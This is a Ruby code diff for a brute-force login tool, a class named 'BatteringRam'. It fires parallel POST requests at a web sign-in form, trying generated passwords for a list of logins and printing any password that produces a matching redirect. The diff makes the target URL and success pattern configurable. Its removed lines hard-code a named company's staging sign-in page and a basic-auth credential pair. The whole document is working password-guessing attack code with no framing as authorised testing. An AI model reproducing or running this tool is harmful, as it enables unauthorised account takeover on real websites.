@@ -2,27 +2,29 @@ require 'typhoeus'
 require 'gentle_brute'
 
 class BatteringRam
-	attr_accessor :brute, :hydra, :min_password_length, :potential_logins, :likely_passwords
+	# ToDo: Allow users to specify specific form fields to be passed
 
-	def initialize(potential_logins, likely_passwords=[], min_password_length=6)
+	attr_accessor :brute, :hydra, :url, :options, :url_options,
+								:min_password_length, :potential_logins, :likely_passwords,
+								:success_match
+
+	def initialize(url, potential_logins, success_match, options)
+		@url = url
+		@options = options
+		@url_options = @options[:url_options] || {method: :post, followlocation: true}
+		@likely_passwords = @options[:likely_passwords] || []
+		@min_password_length = @options[:min_password_length] || 6
 		@potential_logins = potential_logins
-		@likely_passwords = likely_passwords
-		@min_password_length = min_password_length
+		@success_match = success_match
 		@brute = GentleBrute::BruteForcer.new(@min_password_length)
 		@hydra = Typhoeus::Hydra.new
 	end
 
 	def new_login_request(login, password)
-		options = {
-			method: :post,
-		  userpwd: "admin:test",
-		  followlocation: true,
-		  body: { user: {login: login, password: password} },
-		  headers: { "Cache-Control" => "max-age=0" }
-		}
-		request = Typhoeus::Request.new("http://staging.gopro.com/users/sign_in", options)
+		request_options = @url_options.merge(body: { user: {login: login, password: password} })
+		request = Typhoeus::Request.new(@url, request_options)
 		request.on_complete do |response|
-			if response.redirections.any? {|r| r.options[:response_headers].match(/admin/) }
+			if response.redirections.any? {|r| r.options[:response_headers].match(@success_match) }
 				puts("\nThe password for #{login} is [#{password}]!")
 			else
 				print(".")
